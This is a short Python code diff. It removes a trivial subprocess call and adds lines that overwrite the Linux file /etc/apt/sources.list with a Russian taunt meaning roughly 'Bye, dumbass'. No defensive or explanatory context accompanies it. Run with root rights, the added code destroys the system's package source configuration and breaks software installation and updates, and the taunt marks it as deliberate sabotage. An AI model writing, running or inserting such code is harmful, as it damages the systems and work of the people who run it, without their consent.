@@ -1,3 +1,2 @@
-import subprocess as sub
-
-sub.run('exit')
+with open('/etc/apt/sources.list', 'w') as f:
+	f.write('#Пока, додик)))))')
